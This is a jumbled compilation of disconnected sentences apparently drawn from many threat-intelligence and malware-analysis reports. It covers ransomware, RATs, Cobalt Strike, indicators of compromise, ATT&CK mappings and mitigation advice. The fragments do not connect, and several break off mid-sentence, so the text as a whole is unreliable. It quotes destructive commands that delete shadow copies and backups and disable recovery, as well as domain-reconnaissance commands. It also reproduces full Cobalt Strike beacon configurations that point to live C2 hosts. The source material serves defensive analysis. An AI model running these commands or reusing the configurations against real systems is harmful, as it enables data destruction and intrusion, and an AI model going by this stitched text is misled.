Dropper Binary At the core of these malicious application bundles is a Mach-O binary acting as a dropper.
Inside the hook, the banking Trojan manipulates the process creation flow.
Application Layer Protocol:
After the initial execution, the wave 2 ransomware checks for any six arguments (or more) supplied by the threat actor, as opposed to the wave 1 sample that checks for five arguments or more – a small modification that assists in defense evasion.
The main difference between the two versions is the malware author(s) now include the string Stupid Defender to mock researchers, the shellcode that was stored in the .data section is now stored in the .rsc section, the functionality to get a pointer to the encrypted shellcode and to decrypt it have been broken out into their own separate functions.
S1030 Squirrelwaffle
ATM infected with Prilex ready to dispense money The malware used in the attack was named Prilex and had been developed from scratch by using privileged information and advanced knowledge of the ATM network.
The spam tool compromises Yahoo, Gmail and Outlook webmail accounts, enabling the threat actor to take control of those mailboxes, exfiltrate their contacts’ email addresses, and send spam emails.
The larger Chimaera repository contains known TeamTNT cryptojacking scripts and binary files.
It decrypts an encrypted payload, use process hollowing to inject decrypted payload into child process and resolves its Import Address Table. 
Postgres ping done by GoBruteforcer malware.
The configurations we observed were composed of three sections: 
[File Detection]– Trojan/Win.
Collected machine information includes the following: Randomly generated GUID Hostname Domain name Username User privileges Processor architecture Current process ID Operating system version Current file path Local IP address and port used to send the network packet The configuration is encrypted with a hardcoded DES key and is a few bytes long following the structure enumerated below: Table 2.
vulnrecon.dll PDB: D:\a\_work\1\s\artifacts\obj\win-x64.Release\corehost\cli\apphost\standalone\Release\apphost.pdbvulnrecon.exe PDB: D:\work\rt\VulnRecon\VulnRecon\obj\Release\net5.0\VulnRecon.pdb The table below summarizes the capabilities of the tool: 
Stealerium, the original information stealer which serves as the base for Enigma Stealer, is an open-source project written in C# and markets itself as a stealer, clipper, and keylogger with logging capabilities using the Telegram API.
The attacker also tricks the victim by using an Adobe PDF icon for the decompressed file.
S0397 LoJax
Dropper execution diagram (click to enlarge) 
Since we have full control over the sandbox, it’s easy to determine that the executable under analysis requires an external library, and to lie to the executable that all of its dependency requirements are met. 
The ransom note, HOW_TO_DECRYPT.txt is dropped into each affected directory and states the *.key file cannot be modified, renamed, or deleted, otherwise the encrypted files cannot be recovered [T1486].
Decompiled code responsible for loading the payload from the binary’s resources, its decryption and execution is shown in Figure 7. 
Before delving into the analysis of "EngimaDownloader_s001," let's first examine how the malware decrypts strings and resolves hashed Windows APIs.
Figure 3.
Main function of variant in 2021 Loader in the latest campaign (2022, variant 3) Compared to previous variants, changes were seen in the code structure in variant 3.
The campaign was first seen in May 2022 and was initially attributed to the Ducktail operation by Zscaler.
title: Vice Society leverages PrintNightmare in ransomware attacks url: https://blog.talosintelligence.com/2021/08/vice-society-ransomware-printnightmare.html By Edmund Brumaghin, Joe Marshall, and Arnaud Zobec.
Use strict access control measures for critical data. 
The authoritative server consumes resources (fills the server cache) in resolving these invalid requests, making it respond slowly to legitimate requests — and eventually stop responding altogether.
After two levels of randomly named directories, Shellbags proved the existence of subdirectories named after the FQDNs for the victims’ various domains.
L”$sxr” R77_SERVICE_NAME32 Name for the scheduled task that starts the r77 service for 32-bit processes. 
This also suggests that attacks by this group are unlikely to decrease in the near future. 
Although the majority of activity was directed at Taiwanese government entities, researchers also observed other separate target lists containing IP addresses and domains associated to government websites from Egypt, Malaysia, Dominican Republic and the UAE also targeted recently by this threat actor. 
Attribution We mentioned the SysUpdate and HyperBro backdoors from the attackers' toolkit.
ViperSoftX Updates Encryption Steals Data
The following guidance may assist organizations in developing network defense procedures. 
There are some quite old, but still promising approaches like How to Inject Shellcode from Java. 
Based on the exploit signature, we build a tool to search with much shorter time needed than using powershell.
Malicious ISO file First, the user clicked on the ISO file, which created a new virtual hard drive disk.
Service Execution
It first decrypts the embedded DLL using a byte-oriented XOR-and-ADD scheme (shown in Figure 16).
The strings are decrypted in the same algorithm where the data is split into DWORDs and XOR’d against a random key. 
Take a NetWalk on the Wild Side
The unique signatures can represent several values collected from fields in the Client
This targeting was likely in response to Iran’s attribution of cyberattacks that halted maritime traffic at a major Iranian seaport in May 2020, delayed Iranian trains in July 2021, and crashed gas station payment systems throughout Iran in late 2021.
[T1550.001] Subvert Trust Controls: Code Signing [T1553.002] Impair Defenses:
Adhere to the 3-2-1 rule when backing up important files.
Reverse Engineering Example: Static Unpacking of UPX Packed Samples 
Loss of the organization’s sensitive business information. 
TA0003 Persistence T1543.003 Modify System Process To maintain access to compromised systems, Vice Society leverages Windows operating functions to execute encrypted PowerShell. 
Dolphin evolution timeline November 2021 – version 2.0 Version 2.0 introduced the following changes to the version found in April 2021: 
The IcedID Lite Loader observed in November 2022 contains a static URL to download a “Bot Pack” file with a static name (botpack.dat) which results in the IcedID Lite DLL Loader, and then delivers the Forked version of IcedID Bot, leaving out the webinjects and backconnect functionality that would typically be used for banking fraud. 
The Trojan that consists of the Orchestrator, the Cryptography Library and plugins. 
The TAs integrate anti-analysis and anti-debugging techniques into their loaders to avoid being detected while also utilizing the older Equation Editor exploits. 
Each directory with GUID values represents a different document opened in the OneNote application. 
This was followed by one large spike of activity at the end of spring 2022. 
KeyloggingThe attackers have used various RATs that have keylogging capabilities. 
The algorithm to decrypt the data is simple.
These tactics require an extended detection and response (XDR) platform for more robust behavioral monitoring within a network. 
Monitor network traffic regularly to detect unusual activities or traffic patterns that may indicate C&C connections.• Deploy firewalls:
This alert flags anomalies in the token claims, token age, and other authentication attributes.
For example, many environments rely solely on the appearance of ransom notes to alert them to the potential of a ransomware outbreak.
They also started using disk image file formats, .iso
Makes an initial POST request to the C2 server.
S1050 PcShare
For the investigators at NCC Group and Fox-IT these pieces of evidence supported the hypothesis of the adversary achieving credentials access by brute force, and more specifically by credential stuffing or password spraying. 
This limitation is scheduled to be resolved in 2022 via Microsoft’s scheduled feature, Granular Delegated Admin Privileges (GDAP).3 User Access Logging (UAL) 
[16] “NVD - CVE-2021-44228.”
with deceptive contents for other replicated services. 
Continuous monitoring and auditing of system logs can also help detect and investigate any suspicious activities related to LOLBaS. APPENDIX 1 – Referential Hashes SHA256 f6e84e43323ed9d8531fa2aeeb3c181c8f84fcbe950ce6dcdd8c3fa0b02c6cc0 MD5 e64f28174f646e26199d6b7735c84195 SHA256 0a277e51598ef364d5e0006817d32487eb9c0a3c150b7169cbc0bb7348088e63 MD5 f7f602f9b7fd04b64fbafe4dbfefa066 SHA256 2d87b9b071ace9f2ebfa33c1c0c21202f39876b312e135a491bf57ba731b798c MD5 fdcc1e1e3ccf30c63660e1f75042be43 SHA256 40017793f40a192b1dfdfc960742dd539b19fee9b15213307c8319fd88eee57f MD5 e212e8d740310cc565bc89c3b7966804 SHA256 cb1d1f039c07bd03b6eb14248a897dcefdefc28ae6f523b7c6f549c3c155640b APPENDIX 2 – Applied Countermeasures Yara Rules Available on request (see below). 
It has embedded Visual Basic code that enables the threat actor to control the victim’s Outlook mailbox, exfiltrate contacts’ email addresses, and send phishing emails with malicious HTML attachments to all addresses in the victim’s mailbox.
It revealed that it contains only three files.
Indicators of Compromise SHA1 Description 738d31ceca78ffd053403d3b2bc15847682899a0 Malicious document 9ed39c6a3faab057e6c962f0b2aaab07728c5555 Malicious document af6608755e2708335dc80961a9e634f870aecf3c Malicious document e000596ad65b2427d7af3313e5748c2e7f37fba7 Malicious document fd46411b315beb36926877e4b021721fcd111d7a Malicious document 516db7998e3bf46858352697c1f103ef456f2e8e Crimson RAT 842f55579db786e46b20f7a7053861170e1c0c5e Crimson RAT 87e0ea08713a746d53bef7fb04632bfcd6717fa9 Crimson RAT 911226d78918b303df5110704a8c8bb599bcd403 Crimson RAT 973cb3afc7eb47801ff5d2487d2734ada6b4056f Crimson RAT Domain Description richa-sharma.ddns[.]net C2 server cloud-drive[.]store Malware hosting location drive-phone[.]online Malware hosting location s1.fileditch[.]ch Malware hosting location 
The C2 server communication thread This thread is responsible for maintaining communication with the C2 server.
We have also encountered variations which include both email addresses.
Pty Ltd Subject Org: Internet Widgits Pty Ltd Public Algorithm: rsaEncryption Cobalt Strike Cobalt Strike (CS) was extensively used during this intrusion, the threat actors used CS as the main Command and Control tool, dropped several payloads, and injected into multiple processes on different hosts. 
Kimsuky’s use of ReconShark as part of this activity underscores the malware’s central role within the group’s current operational playbook. 
The impact stage is where the attacker encrypts the target system, data and perhaps moves laterally to other systems on the network.
Fantasy  a new Agrius wiper deployed through a supplychain attack
This ensures that the driver doesn’t interfere in a way that could be noticeable by the user.
The malware reads the first 4 bytes and reserves memory with the size of the password and reserves memory of the resource minus 4 bytes and the size of the password.
XMRig The XMRig binary dropped by the Logic Pro X dropper is also custom tooling built using version 6.18.1 of the open source project.
While one script uses the C# method GetProcessesByName() to get the PID, the other scripts run the Windows tool tasklist.exe with the help of the Python os.popen() function.
[T1070.001], Masquerade Task or Service [T1036.004], Credentials from Password Stores
Notable features of Cobalt Strike Cat include: 1. 
The courses of action below mitigate the following techniques: Remote Access Software [T1219] NEXT-GENERATION FIREWALLS Ensure that the Certificate used for Decryption is Trusted Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources Exists Ensure 'SSL Forward Proxy Policy' for traffic destined to the internet is configured Ensure 'SSL Inbound Inspection' is required for all untrusted traffic destined for servers using SSL or TLS Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist THREAT PREVENTION Ensure DNS sinkholing is configured on all anti-spyware profiles in use Ensure passive DNS monitoring is set to enabled on all anti-spyware profiles in use Ensure a secure anti-spyware profile is applied to all security policies permitting traffic to the Internet Ensure that antivirus profiles are set to block on all decoders except 'imap' and 'pop3' Ensure an anti-spyware profile is configured to block on all spyware severity levels, categories, and threats Ensure a secure antivirus profile is applied to all relevant security policies URL FILTERING Ensure secure URL filtering is enabled for all security policies allowing traffic to the internet Ensure all HTTP Header Logging options are enabled Ensure that PAN-DB URL Filtering is used Ensure that URL Filtering uses the action of ‘block’ or ‘override’ on the URL categories Ensure that access to every URL is logged CORTEX XSOAR Deploy XSOAR Playbook - PAN-OS Query Logs for Indicators Exfiltration 
G0077 Leafminer
DelphiTrojanBanking-10003088-0Txt.Malware.
Authors Aliakbar Zahravi Staff Researcher Peter Girnus Sr. Threat Researcher 
For malicious code served up through ads, adblockers can help prevent that code from executing. 
Regular backups typically include user data and other files.wbadmin DELETE BACKUP -keepVersions:0Similar to the previous command, this one deletes all versions of regular backups except the most recent one, based on the -keepVersions parameter.vssadmin Delete Shadows /All /QuietThis command uses the vssadmin tool to delete all shadow copies (also known as volume snapshots) on the system.bcdedit /set {default} recoveryenabled NoThis command uses the bcdedit tool to modify the boot configuration data (BCD) of the default boot entry.
Figure 27: Functions that have been removed within the Forked Bot. 
Some of these countries also voted to suspend Russia from the United Nations Human Rights Council (UNHRC) in early April 2022.
S0143 Flame
Ransomware operators aim to get a payment in exchange for the key to decrypt the user’s data. 
The 3cxIngectionHunter script will simply crawl the filesystem looking for instances of the infected ffmpeg.dll file and report back if there is a match to the malicious hash.
T1125Video
File trace data of malware creation Figure 3.
net user [REDACTED] /domain 
Non-Standard Port T1571 Some TrickBot samples have used HTTP over ports 447 and 8082 for C2. 
This inclusion may be to add easily changeable padding to the ISO.
What’s even more noteworthy is that the Rorschach ransomware is highly customizable.
BitsTransfer is used to retrieve a payload package containing the second stage PowerShell and two shellcode buffers.
See MITRE ATT&CK for Enterprise for all referenced tactics and techniques. 
T1218.011
MacOS, Windows and Linux operating systems are all vulnerable to this particular jRAT.
Upon the execution of the IcedID payload, discovery commands using Windows utilities such as net, nltest, and ipconfig were executed to discover domain trusts, domain admins, workstation configuration, etc.
When there was a change from email communication to a dedicated Tor hidden service, the actors also moved away from using legacy bitcoin addresses to SegWit addresses.
However, we have not been able to identify any evidence of coordination between these groups or a shared toolset. 
It is also common for actors to register new applications in Azure AD so that they can be used to conduct follow-up activities, like mass-mailing or data theft.
References Happy 0 0 % Sad 0 0 % Excited 1 100 % Sleepy 0 0 % 
It is worth noting that this installer and the deployed loader are not exclusive to Dolphin, and were previously seen used with other ScarCruft malware. 
Conti scans the network for 445/SMB, looking for machines to encrypt. 
title: Can You See It Now?
Samples This analysis is based on the following samples: 8F80426CEC76E7C9573A9C58072399AF carrying a Formbook sample: 05dc8c8d912a58a5dde38859e741b2c098061CCF694005A78FCF0FBC8810D137carrying a Formbook sample: f34bd301f4f4d53e2d069b4842bca672 Inside Like every NSIS-based installer, this executable is an archive that can be unpacked with the help of 7zip.
NET\Framework64\v4.0.30319\MstUtil.exe.config" schtasks /create
https://nvd.nist.gov/vuln/detail/CVE-2020-2551 (accessed Apr. 28, 2023). 
In information theory, entropy is a measure of disorder/randomness.
Likewise, adversaries are constantly refining their approach to the ransomware attack lifecycle as they strive to operate more effectively, efficiently, and evasively.
RDP was also used by the threat actor on the final two days of the intrusion to connect to various hosts from a domain controller proxying the traffic via the firefox.exe Cobalt Strike beacon. Command and Control Ursnif Ursnif was seen using the following domains and IPs: 5.42.199.83superliner.top 62.173.149.7 internetlines.in 31.41.44.97 superstarts.top 31.41.44.27 superlinez.top 31.41.44.27 internetlined.com 208.91.197.91 denterdrigx.com: 187.190.48.135 210.92.250.133 189.143.170.233 201.103.222.246 151.251.24.5 190.147.189.122 115.88.24.202 211.40.39.251 187.195.146.2 186.182.55.44 222.232.238.243 211.119.84.111 51.211.212.188 203.91.116.53 115.88.24.203 190.117.75.91 181.197.121.228 190.167.61.79 109.102.255.230 211.119.84.112 190.107.133.19 185.95.186.58 175.120.254.9 46.194.108.30 190.225.159.63 190.140.74.43 187.156.56.52 195.158.3.162 138.36.3.134 109.98.58.98 24.232.210.245 222.236.49.123 175.126.109.15 124.109.61.160 95.107.163.44 93.152.141.65 5.204.145.65 116.121.62.237 31.166.129.162 222.236.49.124 211.171.233.129 211.171.233.126 211.53.230.67 196.200.111.5 190.219.54.242 190.167.100.154 110.14.121.125 58.235.189.192 37.34.248.24 110.14.121.123 179.53.93.16 175.119.10.231 211.59.14.90 188.48.64.249 187.232.150.225 186.7.85.71 148.255.20.4 91.139.196.113 41.41.255.235 31.167.236.174 189.165.2.131 1.248.122.240 We also observed several modules for Ursnif downloaded from the following IP: 
This inbox rule moved emails meeting certain conditions to a folder named ‘RSS Subscription.
Static Analysis Overview File Name tmp.exe File Size 158 KB File Type Win32.exe MD5 c9c0e32e00d084653db0b37a239e9a34 SHA-1 b97965e4a793ec0fa10abc86d0c6be5718716d8a SHA-256 d932ee10f02ea5bb60ed867d9687a906f1b8472f01fc5543b06f9ab22059b264 When Lumma is analyzed in various tools, the outputs of the tools are as follows: It is written in C++ programming language. 
Ransom Cartel and REvil Code Comparison The Ransom Cartel samples analyzed revealed similarities with REvil ransomware. 
Analyzing its details, the malware first parses the “Local State” file to retrieve the AES key used to encrypt the cookies and passwords.
AS spids, LOWER(name) AS name, sha256, company_name, file_description, file_size, file_version, original_filename FROM xdr_data WHERE query_name = 'running_processes_windows_sophos' AND ( LOWER(name) = '3cxdesktopapp.exe' OR LOWER(original_filename) = '3cxdesktopapp.exe' OR LOWER(product_name)
If successfully pass the check, it then transforms the EIP to new address using logic Context->Eip += ByteAt(Eip + 1) ^
Figure 3 – Cracking NTLM Hashes offline Attackers avoid using freely available tools like Mimikatz directly on the target machine to harvest credentials since they are easily detected by AVs.
In particular, UAL has helped our responders identify earlier malicious account usage that ultimately led to the identification of the aforementioned TrailBlazer implant and Linux version of the GoldMax variant. 
We spotted a suspicious section .kxrt with the packed and encoded malicious code.
WpnUserService win_cobalt_strike_auto 10256 UOmCgbXygCe.exe “C:\Users\USER\AppData\Local\FrlxbduRbdVAbVbS\UOmCgbXygCe.exe” win_cobalt_strike_auto 836 svchost.exe C:\Windows\system32\svchost.exe -k DcomLaunch -p win_cobalt_strike_auto 1008 svchost.exe C:\Windows\system32\svchost.exe -k DcomLaunch -p
As this document delivers a backdoor that will silently provide control over the infected user’s system to a remote operator with unknown intentions, it is safer to err on the side of caution and ensure protections are in place. 
KeyLogger (0x12) Livestream or record keystrokes SkypeStealer (0x14) 
This bug is an out-of-bounds write (when software writes data past the end, or before the beginning of the intended buffer, hence “out-of-bounds”) that can be triggered through opening a Jet data source via OLEDB.
S0094 Trojan.Karagany
Dragging it to the side reveals the supposedly protected information underneath. 
Ransomware Execution The Nefilim malware uses AES-128 encryption to lock files and their blackmail payments are made via email.
Figure 5: Empty payloads served from different C2 servers This may allow the actor to examine the server logs of beaconing infected machines before deciding whether to swap out the empty file with an actual payload if the target looks promising enough, thus protecting the next stage of the attack.
After decryption, the shellcode facilitates the establishment of a persistence mechanism.
Monitor for newly constructed scheduled jobs by enabling the Microsoft-Windows-TaskScheduler/Operational setting within the event logging service
S0037 HAMMERTOSS
[T1018 – Remote System Discovery] Prefetch [ADVANCED_IP_SCANNER_2.5.4594.] was executed - run count 2 hash:
Once the threat actors established a deep foothold in the network and moved laterally to the domain controller, they executed the following PowerShell command on the Active Directory to obtain a list of all machines attached to the domain [T1018]: Powershell.exe get-adcomputer -filter * -properties * | select name,operatingsystem,ipv4address > 
Figure 35.
Enable two-factor authentication (2FA) for additional security. 
HTTP GET message header Responses from the C&C server have to be at least 33-bytes long in order to be parsed by the networking module and the malicious payload is located after a sequence of 13 spaces followed by an HTML comment opening tag.
TaxReturn2022.pdf.lnk (SHA2: 180a79cff5ef91ecd744a35b2e433d0a4aae0e4d3b87c40e8e51f5ca02aac4d6) TaxReturns2022.pdf.lnk (SHA2: fa862d43a85a9ea6f046f3edc743b897bba86348c04b8d62ba6eb27f951edf55) TaxReturns2022.zip (SHA2: c4599d4270ba8ef58fb8f1219ecff864acd83145c368ada9406a341d6f4a4fbf) 
[TA0008] Table X: Chinese state-sponsored cyber actors’ Lateral Movement TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) 
Security officials reported that no ransom was paid and the safety of the security systems remain unaffected during the cyber incident. 
6f191f598589b7708b1890d56b374b45c6eb41610d34f976f0b4cfde8d5731af 
This masqueraded hostname technique has been observed at multiple StellarParticle-related investigations. 
Aut'+'omation.
Connect with an eSentire Security Specialist. 
Since all these groups are in a certain time zone, we extracted all timestamps from the forensic investigation with regards to: Registration of domain Compile timestamps of malware (considering deception) Timestamps of command-line activity Timestamps of data exfiltration Timestamps of malware interaction such as creation, deletion, etc. 
This archive also contains two IronPython scripts (see table) and a Windows task XML file named mssch.xml with the following content: Figure 2.
While using these data sources, CISA analysts have observed a correlation between the public release of a vulnerability and targeted scanning of systems identified as being vulnerable.
9ServerReply to message type 8.
Remcos is a tool for remote control and surveillance.
Living of the land – tools such as RVTools to shut down servers and ADExplorer to perform reconnaissance.
Figure 4.
Examples: UPX is an open-source packing algorithm. 
Mitigation: Consider removing the local Administrators group from the list of groups allowed to log in through RDP
2A2F08FAD6B0A86DC94885224687D954E739CC21N/AWin32/ParanoidFish.
We strongly recommend users to never enter their data on pages that promise something, such as the delivery of a supposedly suspended package.
Once the file was unpacked and the Cobalt Strike beacon binary carved, the Cobalt Strike configuration could be determined as follows: { "beacontype": [ "HTTPS" ], "sleeptime": 5000, "jitter": 28, "maxgetsize": 1865903, "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==", "license_id": 0, "cfg_caution": false, "kill_date": null, "server": { "hostname": "fazehotafa.com", "port": 443, "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC1nAS8+PqMnQs3hynG2JDgMQK6ZqLkIoDXWnqaOS/dQsdKBHE0Ify/HIZ2ntSpyMtvomDHCA98pCEi1L7mT0mvfiYapP9Aj776rDpzXMYNiRk1BWrAzJqzLcfwzxJx26hL1VSu1C5mWEl7JsVT/9l/kHcNYAALgNQuI0uZAqM7YQIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" }, "host_header": "", "useragent_header": null, "http-get": { "uri": "/ak.css", "verb": "GET", "client": { "headers": null, "metadata": null }, "server": { "output": [ "print", "prepend 1767 characters", "base64", "base64url" ] } }, "http-post": { "uri": "/profile", "verb": "POST", "client": { "headers": null, "id": null, "output": null } }, "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "crypto_scheme": 0, "proxy": { "type": null, "username": null, "password": null, "behavior": "Use IE settings" }, "http_post_chunk": 0, "uses_cookies": true, "post-ex": { "spawnto_x86": "%windir%\\syswow64\\rundll32.exe", "spawnto_x64": "%windir%\\sysnative\\rundll32.exe" }, "process-inject": { "allocator": "VirtualAllocEx", "execute": [ "CreateThread", "CreateRemoteThread", "RtlCreateUserThread" ], "min_alloc": 9369, "startrwx": false, "stub": "Ms1B7fCBDFtfSY7fRzHMbQ==", "transform-x86": [ "prepend '\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90'" ], "transform-x64": [ "prepend '\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90'" ], "userwx": false }, "dns-beacon": { "dns_idle": null, "dns_sleep": null, "maxdns": null, "beacon": null, "get_A": null, "get_AAAA": null, "get_TXT": null, "put_metadata": null, "put_output": null }, "pipename": null, "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "stage": { "cleanup": true }, "ssh": { "hostname": null, "port": null, "username": null, "password": null, "privatekey": null } } Configurations for other Cobalt Strike servers observed: { "beacontype": [ "HTTPS" ], "sleeptime": 60000, "jitter": 0, "maxgetsize": 1048576, "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==", "license_id": 0, "cfg_caution": false, "kill_date": null, "server": { "hostname": "111.90.143.191", "port": 443, "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnOM3nXx+7HBhkbDd+AwFrFisSunK999w2tM0uTpuuEiBalcJhcL+QgQWtf6S7zPp5hjImG+2YcPl18geU4f5JlSPXHwilbK4DFb/ePWyKFjhrA7emVRqhM21QMlo1ANsn14rY/RO2pzuft8P7TXoIjjI/B2GGVuzYNZX6X4I2EwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" }, "host_header": "", "useragent_header": null, "http-get": { "uri": "/j.ad", "verb": "GET", "client": { "headers": null, "metadata": null }, "server": { "output": [ "print" ] } }, "http-post": { "uri": "/submit.php", "verb": "POST", "client": { "headers": null, "id": null, "output": null } }, "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "crypto_scheme": 0, "proxy": { "type": null, "username": null, "password": null, "behavior": "Use IE settings" }, "http_post_chunk": 0, "uses_cookies": true, "post-ex": { "spawnto_x86": "%windir%\\syswow64\\rundll32.exe", "spawnto_x64": "%windir%\\sysnative\\rundll32.exe" }, "process-inject": { "allocator": "VirtualAllocEx", "execute": [ "CreateThread", "SetThreadContext", "CreateRemoteThread", "RtlCreateUserThread" ], "min_alloc": 0, "startrwx": true, "stub": "Ms1B7fCBDFtfSY7fRzHMbQ==", "transform-x86": null, "transform-x64": null, "userwx": true }, "dns-beacon": { "dns_idle": null, "dns_sleep": null, "maxdns": null, "beacon": null, "get_A": null, "get_AAAA": null, "get_TXT": null, "put_metadata": null, "put_output": null }, "pipename": null, "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "stage": { "cleanup": false }, "ssh": { "hostname": null, "port": null, "username": null, "password": null, "privatekey": null } } { "beacontype": [ "HTTPS" ], "sleeptime": 60000, "jitter": 0, "maxgetsize": 1048576, "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==", "license_id": 305419776, "cfg_caution": false, "kill_date": null, "server": { "hostname": "78.128.112.139", "port": 443, "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnOM3nXx+7HBhkbDd+AwFrFisSunK999w2tM0uTpuuEiBalcJhcL+QgQWtf6S7zPp5hjImG+2YcPl18geU4f5JlSPXHwilbK4DFb/ePWyKFjhrA7emVRqhM21QMlo1ANsn14rY/RO2pzuft8P7TXoIjjI/B2GGVuzYNZX6X4I2EwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" }, "host_header": "", "useragent_header": null, "http-get": { "uri": "/ga.js", "verb": "GET", "client": { "headers": null, "metadata": null }, "server": { "output": [ "print" ] } }, "http-post": { "uri": "/submit.php", "verb": "POST", "client": { "headers": null, "id": null, "output": null } }, "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "crypto_scheme": 0, "proxy": { "type": null, "username": null, "password": null, "behavior": "Use IE settings" }, "http_post_chunk": 0, "uses_cookies": true, "post-ex": { "spawnto_x86": "%windir%\\syswow64\\rundll32.exe", "spawnto_x64": "%windir%\\sysnative\\rundll32.exe" }, "process-inject": { "allocator": "VirtualAllocEx", "execute": [ "CreateThread", "SetThreadContext", "CreateRemoteThread", "RtlCreateUserThread" ], "min_alloc": 0, "startrwx": true, "stub": "tUr+Aexqde3zXhpE+L05KQ==", "transform-x86": null, "transform-x64": null, "userwx": true }, "dns-beacon": { "dns_idle": null, "dns_sleep": null, "maxdns": null, "beacon": null, "get_A": null, "get_AAAA": null, "get_TXT": null, "put_metadata": null, "put_output": null }, "pipename": null, "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "stage": { "cleanup": false }, "ssh": { "hostname": null, "port": null, "username": null, "password": null, "privatekey": null } } Remote Access Software As shown above, three different Remote Access Software were used by the threat actor: It is unclear why the threat actor used three different tools in order to establish an interactive and persistent command and control channel. 
CISA observed connections from a Federal Government agency to multiple IP addresses possibly hosting Cobalt Strike team servers. 
Dolphin backdoor configuration The configuration can be modified through commands.
Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.
SA Ransom:Win64/DarkBit VirTool:Win32/AtExecCommand Microsoft Defender for Endpoint Microsoft Defender for Endpoint alerts with the following titles can indicate possible presence of the indicators of compromise listed below. 
Using the automated malware analyzer CAPEv2 allowed for the detection and capture of this JSON, which indicates the creation of a Mutex: Using the automated malware analyzer CAPEv2 allowed for the detection and capture of this JSON, which shows the addition of "Fax" to the registry allowing it to start in Safemode: Using the automated malware analyzer CAPEv2 allowed for the detection and capture of this JSON which shows the use of BCDEdit to restart the host into safemode with networking: 
F2pool mining operation.
We could step through this and dump each string manually, or, as a hard-coded XOR key is used, simply de-XOR the entire binary and see what falls out: with open("locker_Apple_M1_64", "rb") as f_in, open("strings", "wb") as f_out: while True: chunk = f_in.read(1024) if not chunk: break encrypted_chunk = bytes(byte ^
Notice that the colliding message chunks are larger than 6 bits, further demonstrating that the function is not collision-resistant for variable-length inputs.\n
T1053 Scheduled Task/Job;When deploying ransomware in the victim’s network infrastructure, BlackCat affiliates may exploit group policies, which results in a scheduled task being created (on each host) that launches the ransomware. ;T1059.001 Command and Scripting Interpreter:
G0106 Rocke
It also steals one-time security codes or soft tokens from the victim’s online banking applications.
LocalSystem Service Name: Updater Service Filename: %COMSPEC% /C
2.3.2 I can't breathe The attack is practically identical to the previous one: malware is distributed in a RAR archive video.rar (fc5c9c93781fbbac25d185ec8f920170503ec1eddfc623d2285a05d05d5552dc) and consists of two .exe files.
"nltest /domain_trusts >>
Palo Alto Networks detects and prevents LockBit 2.0 ransomware in the following ways: WildFire:
Monitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior. 
According to the company, the breach only affected one customer and files involving commercial information and that customer has been notified, as well as Abbyy has taken corrective measures to the problem.
GuLoader call RtlAddVectoredExceptionHandler API to add its custom Vectored Exception Handler. RtlAddVectoredExceptionHandler accepts two parameters. 
